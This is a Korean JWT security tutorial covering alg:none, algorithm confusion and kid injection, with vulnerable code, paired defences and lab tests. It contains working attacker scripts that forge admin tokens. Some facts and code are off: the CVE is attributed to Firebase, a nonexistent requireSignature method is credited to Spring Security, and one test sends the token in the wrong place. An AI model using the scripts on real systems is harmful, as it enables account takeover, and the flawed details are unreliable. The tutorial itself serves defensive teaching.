# JWT 취약점 완전 분해
---

## 🎯 핵심 질문
JWT(JSON Web Token)를 사용할 때 발생하는 가장 치명적인 보안 결함은 무엇인가? 공격자가 서명 검증을 우회하거나 알고리즘을 조작하여 임의의 사용자로 위장할 수 있다면, 모든 인증 시스템이 무너진다.

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### CVE-2015-9235와 실제 사고 분석
2015년 Firebase(Google의 실시간 DB 서비스)에서 JWT 구현 결함이 발견되었다. `alg:none` 헤더를 이용하면 모든 사용자의 인증 토큰을 조작할 수 있었다. 공격자는 다른 사용자의 데이터에 무제한 접근할 수 있었다.

### Auth0, Okta 등 대형 IAM 플랫폼의 경험담
많은 기업에서 JWT를 도입했을 때 다음 문제들이 발생했다:
- 클라이언트 라이브러리가 자동으로 `alg:none` 검증을 통과시킴
- RS256(공개키)과 HS256(대칭키)을 혼동하면, 공개키를 HMAC 비밀키로 사용되어 누구나 토큰 위조 가능
- `kid`(Key ID) 헤더를 조작하여 서명 키를 공격자가 지정하도록 만듦

### 실무 영향도
- 전체 사용자 기반에 대한 인증 우회: 관리자 계정, 일반 사용자 구분 없음
- 데이터 탈취, 수정, 삭제: 서비스 무결성 상실
- 규정 위반: GDPR, PCI-DSS 등에서 인증 실패 시 높은 벌금

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### 1. alg:none 검증을 제대로 하지 않는 경우

```java
// ❌ 취약한 코드: JWT 라이브러리가 alg:none을 받아들임
import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;

public class VulnerableJwtValidator {
    
    public void validateToken(String token) {
        // 알고리즘을 명시하지 않으면 라이브러리가 모든 알고리즘 허용
        DecodedJWT decodedJWT = JWT.decode(token);
        
        // alg:none이 자동으로 수용됨 → 서명 검증 생략
        String userId = decodedJWT.getSubject();
        System.out.println("User ID: " + userId);
    }
}

// 공격자의 Python 페이로드 생성 코드
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "admin": True}

encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# alg:none이므로 서명 부분은 빈 문자열
malicious_token = f"{encoded_header}.{encoded_payload}."
print(f"공격 토큰: {malicious_token}")
```

**공격 원리:**
- JWT 포맷: `header.payload.signature`
- `alg:none`이 설정되면 서명(`signature`)이 필요 없음
- 서버가 검증 로직을 건너뛰고 `payload`의 클레임을 신뢰

### 2. RS256과 HS256 알고리즘 혼동

```java
// ❌ 취약한 코드: 알고리즘 검증이 약함
import io.jsonwebtoken.Jwts;

public class AlgoConfusionVulnerable {
    
    public String validateWithPublicKey(String token, String publicKeyPem) {
        try {
            // PublicKey로 RS256 검증 시작
            PublicKey publicKey = getPublicKeyFromPem(publicKeyPem);
            
            // ❌ 문제: 클라이언트가 보낸 토큰의 alg 헤더를 확인하지 않음
            // 공격자가 HS256으로 변경하고 publicKey(공개된 것)를 비밀키로 사용
            String claim = Jwts.parserBuilder()
                .setSigningKey(publicKey)
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
            
            return claim;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    
    private PublicKey getPublicKeyFromPem(String publicKeyPem) {
        // PEM 파싱 로직 (생략)
        return null;
    }
}

// 공격 프로세스
// 1. 서버의 공개 키를 다운로드: GET /.well-known/jwks.json
// 2. 공개 키 값 (n, e)를 획득
// 3. 공개 키를 문자열로 변환
String publicKeyString = "-----BEGIN PUBLIC KEY-----\nMFwwDQYJKo...\n-----END PUBLIC KEY-----";

// 4. HMAC-SHA256으로 서명 생성 (공개키를 비밀키로 사용)
String maliciousToken = Jwts.builder()
    .setSubject("admin")
    .claim("role", "administrator")
    .signWith(SignatureAlgorithm.HS256, publicKeyString.getBytes())
    .compact();

System.out.println("Algorithm Confusion 공격 토큰: " + maliciousToken);
```

**공격 원리:**
- RS256은 비대칭 암호화: 서버는 공개키로만 검증
- HS256은 대칭 암호화: 동일한 비밀키로 서명과 검증
- 공격자가 `alg:RS256` → `alg:HS256`으로 변경하고, 서명을 공개키로 생성
- 서버가 "어떤 알고리즘이든 검증하기만 하면 된다"고 생각하면, 공개키(비밀키로 오용)로 검증이 성공

### 3. kid 헤더 인젝션으로 서명 키 조작

```java
// ❌ 취약한 코드: kid 헤더 값을 검증하지 않음
import io.jsonwebtoken.Jwts;

public class KidInjectionVulnerable {
    
    private KeyStore keyStore;  // 여러 키를 관리하는 저장소
    
    public String validateWithKid(String token) {
        try {
            // JWT 헤더에서 kid 값 추출
            String kid = getKidFromToken(token);
            
            // ❌ 문제: kid를 입력으로 그대로 사용하여 키 조회
            // 공격자가 kid = "../../etc/passwd" 또는 임의의 파일 경로 지정
            Key key = keyStore.getKey(kid);  // 경로 조작 가능
            
            String claim = Jwts.parserBuilder()
                .setSigningKey(key)
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
            
            return claim;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    
    // ❌ 위험: 공격자가 임의의 파일을 키로 사용하도록 유도
    // kid = "admin" → 정상 서명 키
    // kid = "example-app-key-123" → 공격자가 임의로 설정한 값
    // kid = "/opt/myapp/public-keys/attacker.pub" → 경로 조작
}

// 공격 페이로드 (Python)
import jwt
import json

# 공격자가 원하는 페이로드
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# 임의의 비밀키 (예: 단순 문자열)
attacker_secret = "attacker-secret-key"

# ❌ kid를 경로 조작 값으로 설정
headers = {
    "alg": "HS256",
    "kid": "../../etc/passwd"  # 경로 조작 시도
}

malicious_token = jwt.encode(
    payload,
    attacker_secret,
    algorithm="HS256",
    headers=headers
)

print(f"KID 인젝션 토큰: {malicious_token}")
```

**공격 원리:**
- `kid`(Key ID)는 서명에 사용한 키를 식별하는 헤더
- 서버가 `kid` 값을 검증하지 않으면, 공격자가 `../`, 파일명 등으로 조작
- 서버가 파일 시스템이나 DB에서 키를 로드할 때, 공격자 지정 경로에서 로드됨
- 결국 공격자가 임의로 설정한 비밀키로 서명한 토큰도 유효해짐

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### 1. alg:none 완전 차단

```java
// ✅ 안전한 코드: 명시적 알고리즘 화이트리스트
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import javax.crypto.SecretKey;

public class SecureJwtValidator {
    
    private final SecretKey key;
    
    public SecureJwtValidator(String secret) {
        // 256비트 이상 키 사용
        this.key = Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
    }
    
    public String validateToken(String token) {
        try {
            // ✅ 핵심: 명시적으로 HS256만 허용
            String subject = Jwts.parserBuilder()
                .setSigningKey(key)
                .requireSignature()  // 서명 필수
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
            
            return subject;
        } catch (io.jsonwebtoken.SignatureException e) {
            throw new RuntimeException("서명 검증 실패: " + e.getMessage());
        } catch (io.jsonwebtoken.JwtException e) {
            throw new RuntimeException("JWT 파싱 실패: " + e.getMessage());
        }
    }
}

// Spring Security 설정에서의 올바른 사용
@Configuration
public class SecurityConfig {
    
    @Bean
    public JwtDecoder jwtDecoder() {
        // ✅ Spring Security 기본 설정: RS256 검증
        JwtDecoder decoder = JwtDecoders.fromIssuerLocation("https://auth-server.com");
        
        // 추가 검증 강화
        ((NimbusJwtDecoder) decoder).setJwtValidator(jwtValidator());
        
        return decoder;
    }
    
    @Bean
    public OAuth2TokenValidator<Jwt> jwtValidator() {
        List<OAuth2TokenValidator<Jwt>> validators = new ArrayList<>();
        
        // 서명 검증 (기본)
        validators.add(new JwtTimestampValidator());
        
        // 커스텀 클레임 검증
        validators.add(jwt -> {
            String algorithm = jwt.getHeaders().get("alg").toString();
            
            // ✅ alg:none 명시적 차단
            if ("none".equalsIgnoreCase(algorithm)) {
                return OAuth2TokenValidationResult.failure(
                    new OAuth2Error("invalid_token", "alg:none은 허용되지 않습니다")
                );
            }
            
            // ✅ RS256만 허용
            if (!"RS256".equals(algorithm)) {
                return OAuth2TokenValidationResult.failure(
                    new OAuth2Error("invalid_token", "RS256 알고리즘만 허용됩니다")
                );
            }
            
            return OAuth2TokenValidationResult.success();
        });
        
        return new DelegatingOAuth2TokenValidator<>(validators);
    }
}
```

### 2. 알고리즘 혼동 방지

```java
// ✅ 안전한 코드: RS256 명시적 검증
import io.jsonwebtoken.Jwts;
import java.security.PublicKey;

public class SecureAlgorithmValidation {
    
    private final PublicKey publicKey;
    
    public SecureAlgorithmValidation(PublicKey publicKey) {
        this.publicKey = publicKey;
    }
    
    public String validateTokenRs256(String token) {
        try {
            // ✅ 핵심: RS256으로만 검증, 다른 알고리즘은 차단
            String subject = Jwts.parserBuilder()
                .setSigningKey(publicKey)
                .requireSignature()
                // ❌ 이 메서드는 JJWT 최신 버전에서만 지원
                // 대신 직접 알고리즘 확인 필요
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
            
            // ✅ 추가: 사용된 알고리즘 확인
            Jws<Claims> jws = Jwts.parserBuilder()
                .setSigningKey(publicKey)
                .build()
                .parseClaimsJws(token);
            
            String usedAlgorithm = jws.getHeader().get("alg").toString();
            if (!"RS256".equals(usedAlgorithm)) {
                throw new SecurityException("RS256만 허용됩니다. 사용된 알고리즘: " + usedAlgorithm);
            }
            
            return subject;
        } catch (Exception e) {
            throw new RuntimeException("토큰 검증 실패: " + e.getMessage());
        }
    }
}

// Spring Security OAuth2 로그인에서 RS256 명시
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .oauth2Login(oauth2 -> oauth2
            .tokenEndpoint(token -> token
                .accessTokenResponseClient(accessTokenResponseClient())
            )
        )
        .build();
    
    return http.build();
}

@Bean
public OAuth2AccessTokenResponseClient<OAuth2AuthorizationCodeGrantRequest> 
    accessTokenResponseClient() {
    
    DefaultAuthorizationCodeTokenResponseClient client = 
        new DefaultAuthorizationCodeTokenResponseClient();
    
    // ✅ RS256만 수용하는 컨버터 설정
    client.setRequestEntityConverter(
        new OAuth2AuthorizationCodeGrantRequestEntityConverter()
    );
    
    return client;
}
```

### 3. kid 헤더 안전한 처리

```java
// ✅ 안전한 코드: kid 화이트리스트 및 경로 검증
import io.jsonwebtoken.Jwts;
import java.security.Key;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class SecureKidValidation {
    
    // ✅ 사전에 정의된 키 ID만 사용
    private static final Map<String, Key> ALLOWED_KEYS = new HashMap<>();
    private static final Pattern KID_PATTERN = Pattern.compile("^[a-zA-Z0-9_-]+$");
    
    static {
        // 키 초기화: 서버 시작 시 미리 정의
        // ALLOWED_KEYS.put("key-2024-prod", loadKey("prod-key.pem"));
        // ALLOWED_KEYS.put("key-2024-staging", loadKey("staging-key.pem"));
    }
    
    public String validateTokenWithKid(String token) {
        try {
            // 토큰 파싱 (검증 없이 헤더만 추출)
            String kid = extractKidFromToken(token);
            
            // ✅ kid 검증 1: 화이트리스트 확인
            if (kid == null || !ALLOWED_KEYS.containsKey(kid)) {
                throw new SecurityException("허용되지 않는 kid: " + kid);
            }
            
            // ✅ kid 검증 2: 형식 검증 (경로 조작 방지)
            if (!KID_PATTERN.matcher(kid).matches()) {
                throw new SecurityException("유효하지 않은 kid 형식: " + kid);
            }
            
            // ✅ 화이트리스트에서 키 조회
            Key key = ALLOWED_KEYS.get(kid);
            
            String subject = Jwts.parserBuilder()
                .setSigningKey(key)
                .build()
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
            
            return subject;
        } catch (Exception e) {
            throw new RuntimeException("토큰 검증 실패: " + e.getMessage());
        }
    }
    
    private String extractKidFromToken(String token) {
        // JWT 헤더 파싱 (검증 없이)
        String[] parts = token.split("\\.");
        if (parts.length != 3) return null;
        
        String headerJson = new String(
            Base64.getUrlDecoder().decode(parts[0]),
            StandardCharsets.UTF_8
        );
        
        JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
        return header.has("kid") ? header.get("kid").getAsString() : null;
    }
}

// 동적 키 로드 (JWKS Endpoint 사용)
@Component
public class JwksKeyProvider {
    
    private final Map<String, PublicKey> keyCache = new ConcurrentHashMap<>();
    private final String jwksUrl = "https://auth-server.com/.well-known/jwks.json";
    
    @PostConstruct
    public void loadKeys() {
        // 서버 시작 시 JWKS 다운로드
        refreshKeys();
    }
    
    @Scheduled(fixedRate = 3600000)  // 1시간마다 갱신
    public void refreshKeys() {
        try {
            // ✅ JWKS 엔드포인트에서 공개 키 다운로드
            String jwksJson = restTemplate.getForObject(jwksUrl, String.class);
            JsonArray keys = JsonParser.parseString(jwksJson)
                .getAsJsonObject()
                .getAsJsonArray("keys");
            
            for (JsonElement keyElement : keys) {
                JsonObject keyObj = keyElement.getAsJsonObject();
                String kid = keyObj.get("kid").getAsString();
                
                // ✅ kid를 정규표현식으로 검증
                if (!Pattern.matches("^[a-zA-Z0-9_-]+$", kid)) {
                    continue;  // 의심스러운 kid는 건너뜀
                }
                
                // RSA 공개 키 복원
                PublicKey publicKey = reconstructPublicKey(keyObj);
                keyCache.put(kid, publicKey);
            }
        } catch (Exception e) {
            System.err.println("JWKS 로드 실패: " + e.getMessage());
        }
    }
    
    public PublicKey getKey(String kid) {
        PublicKey key = keyCache.get(kid);
        if (key == null) {
            throw new SecurityException("알 수 없는 kid: " + kid);
        }
        return key;
    }
    
    private PublicKey reconstructPublicKey(JsonObject keyObj) {
        // RSA 공개 키 복원 로직 (JWK에서)
        // 생략
        return null;
    }
}
```

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### alg:none 공격의 내부 동작

**Step 1: 정상 JWT 획득**
```
정상 토큰: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
          eyJzdWIiOiJ1c2VyMTIzIn0.
          TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

**Step 2: 토큰 수정**
- 페이로드 부분 Base64 디코드
- `{"sub":"user123"}` → `{"sub":"admin"}`
- Base64 인코드
- 서명 부분 제거 (빈 문자열로 변경)

**Step 3: 공격 토큰 생성**
```
공격 토큰: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
          eyJzdWIiOiJhZG1pbiJ9.
          (빈 문자열)
```

**Step 4: 서버 검증 과정**
```
1. 토큰 파싱: header.payload.signature 분리
2. 헤더 읽기: {"alg":"none","typ":"JWT"}
3. ❌ alg:none 확인하지 않음
4. 서명 검증 건너뜀
5. 페이로드 신뢰: {"sub":"admin"} → admin 사용자로 인증됨
```

### Algorithm Confusion 공격의 메커니즘

```
정상 서버 흐름:
[클라이언트] 
  ↓
[RS256으로 토큰 서명]
  ↓
[공개 키로 검증하는 서버] ← 공개 키는 다운로드 가능

공격 흐름:
[공격자]
  ↓
[공개 키 다운로드 (JWKS 엔드포인트)]
  ↓
[HS256으로 변경, 공개 키를 비밀키로 사용하여 서명 생성]
  ↓
[공격 토큰 전송]
  ↓
[서버: HS256 인식, 공개 키(잘못된 용도)로 검증] ← 성공!
```

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: alg:none 공격 재현

```bash
# 1. Python으로 공격 토큰 생성
cat > generate_none_attack.py << 'EOF'
import base64
import json

def urlsafe_b64encode_no_padding(data):
    encoded = base64.urlsafe_b64encode(json.dumps(data).encode()).decode()
    return encoded.rstrip('=')

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}

token = f"{urlsafe_b64encode_no_padding(header)}.{urlsafe_b64encode_no_padding(payload)}."
print(f"공격 토큰: {token}")
EOF

python3 generate_none_attack.py
```

### 실험 2: 취약한 서버에 공격

```java
// 취약한 컨트롤러
@RestController
public class VulnerableAuthController {
    
    @GetMapping("/vulnerable")
    public String vulnerable(@RequestHeader("Authorization") String authHeader) {
        String token = authHeader.replace("Bearer ", "");
        
        // ❌ JWT 디코드만 하고 검증하지 않음
        String[] parts = token.split("\\.");
        String headerJson = new String(Base64.getUrlDecoder().decode(parts[0]));
        String payloadJson = new String(Base64.getUrlDecoder().decode(parts[1]));
        
        JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
        JsonObject payload = JsonParser.parseString(payloadJson).getAsJsonObject();
        
        // ❌ alg:none 확인 안함
        String userId = payload.get("sub").getAsString();
        String role = payload.get("role").getAsString();
        
        return String.format("User: %s, Role: %s", userId, role);
    }
}

// 테스트 코드
@SpringBootTest
public class JwtVulnerabilityTest {
    
    @Autowired
    private TestRestTemplate restTemplate;
    
    @Test
    public void testAlgNoneAttack() {
        // 공격 토큰
        String maliciousToken = "eyJhbGciOiJub25lIn0." +
            "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.";
        
        ResponseEntity<String> response = restTemplate.getForEntity(
            "/vulnerable?Authorization=Bearer " + maliciousToken,
            String.class
        );
        
        // 결과: User: admin, Role: administrator
        // ❌ 공격 성공!
        assertTrue(response.getBody().contains("admin"));
    }
}
```

### 실험 3: 안전한 서버에서 공격 차단 확인

```java
// 안전한 컨트롤러
@RestController
public class SecureAuthController {
    
    @Autowired
    private SecureJwtValidator jwtValidator;
    
    @GetMapping("/secure")
    public String secure(@RequestHeader("Authorization") String authHeader) {
        String token = authHeader.replace("Bearer ", "");
        
        // ✅ 검증된 주제 반환
        String userId = jwtValidator.validateToken(token);
        return String.format("User: %s", userId);
    }
}

// 테스트 코드
@SpringBootTest
public class SecureJwtTest {
    
    @Autowired
    private TestRestTemplate restTemplate;
    
    @Test
    public void testAlgNoneRejected() {
        String maliciousToken = "eyJhbGciOiJub25lIn0." +
            "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.";
        
        assertThrows(
            HttpClientErrorException.Unauthorized.class,
            () -> restTemplate.getForEntity(
                "/secure?Authorization=Bearer " + maliciousToken,
                String.class
            )
        );
        
        // ✅ 공격 차단됨!
    }
}
```

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 항목 | 공격 성공 조건 | 방어 성공 조건 |
|------|--------------|--------------|
| **alg:none** | 서버가 alg:none을 수용 | 명시적으로 HS256/RS256만 허용 |
| **Algorithm Confusion** | 서버가 모든 alg를 수용 | 각 클라이언트마다 고정 alg만 허용 |
| **kid 인젝션** | kid를 검증하지 않음 | 사전 정의된 화이트리스트만 수용 |
| **서명 검증** | 검증 생략 (alg:none) | `requireSignature()` 필수 설정 |
| **key 강도** | 대칭키 < 256비트 | HMAC-SHA256 이상 사용 |
| **만료 시간** | 검증 안함 | `exp` 클레임 필수 검증 |

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 알고리즘 경직성 vs 유연성
- **보안**: 클라이언트마다 고정 알고리즘 강제 → RS256 OR HS256 선택 후 변경 불가
- **사용성**: 새로운 클라이언트 추가 시 알고리즘 호환성 고민 필요
- **트레이드오프**: 관리자 개입 필요 (자동화 복잡도 증가)

### 2. kid 동적 로드 vs 정적 정의
- **보안**: 정적 화이트리스트 → 경로 조작 완전 차단
- **사용성**: 새 키 추가/회전 시 서버 재배포 필요
- **트레이드오프**: JWKS 엔드포인트로 동적 로드하되, 다운로드한 키의 kid를 정규식으로 검증

### 3. 만료 시간 검증 vs 토큰 장기 유효성
- **보안**: 짧은 만료 시간 (15분) → 토큰 탈취 후 피해 제한
- **사용성**: 사용자가 자주 재인증해야 함
- **트레이드오프**: Refresh Token 사용 (Access Token 15분, Refresh Token 7일)

## 📌 핵심 정리

1. **alg:none 차단**: 모든 JWT 라이브러리가 이를 허용하지 않도록 설정
   ```java
   .requireSignature()  // 서명 필수
   ```

2. **알고리즘 명시**: RS256 또는 HS256 중 하나만 명확히 선택
   ```java
   if (!"RS256".equals(algorithm)) throw new Exception();
   ```

3. **kid 화이트리스트**: 사전에 정의된 키 ID만 수용
   ```java
   if (!ALLOWED_KEYS.containsKey(kid)) throw new Exception();
   ```

4. **정규식 검증**: kid 형식 검증으로 경로 조작 차단
   ```java
   if (!Pattern.matches("^[a-zA-Z0-9_-]+$", kid)) throw new Exception();
   ```

5. **만료 시간 검증**: `exp` 클레임 필수 검증
   ```java
   if (Clock.systemUTC().instant().isAfter(expirationTime)) throw new Exception();
   ```

## 🤔 생각해볼 문제 (+ 해설)

### 문제 1: RS256과 HS256의 핵심 차이점은?
**해설:**
- RS256: 비대칭 암호화 (공개키/비밀키) → 공개키는 배포 가능, 비밀키는 서버만 보유
- HS256: 대칭 암호화 (동일 비밀키) → 비밀키를 모든 검증자가 보유해야 함
- **함정**: RS256에서 공개키가 "공개"되어 있다고 해서 안전한 것 아님. 공격자가 `alg:RS256` → `alg:HS256`으로 조작하면, 공개키를 비밀키로 오용 가능

### 문제 2: JWKS 엔드포인트(`.well-known/jwks.json`)는 왜 공개되는가?
**해설:**
- JWKS는 공개키만 포함 → 누구나 토큰을 검증할 수 있어야 하므로 공개 필요
- 하지만 공개되었다는 이유로 `kid` 값도 신뢰하면 안됨
- **방어**: kid를 화이트리스트로 관리하고, 정규식 검증 필수

### 문제 3: 왜 Spring Security는 `requireSignature()` 메서드를 제공하는가?
**해설:**
- 레거시 코드나 특수한 경우 (예: 토큰을 단순 식별자로만 사용) 서명 검증을 건너뛸 수 있음
- 하지만 인증 시스템에서는 **반드시** 활성화해야 함
- 기본값이 활성화되지 않은 라이브러리도 있으므로 명시적 설정 필수

---

<div align="center">

**[홈으로 🏠](../README.md)** | **[다음: JWT 안전한 구현 ➡️](./02-jwt-secure-implementation.md)**

</div>
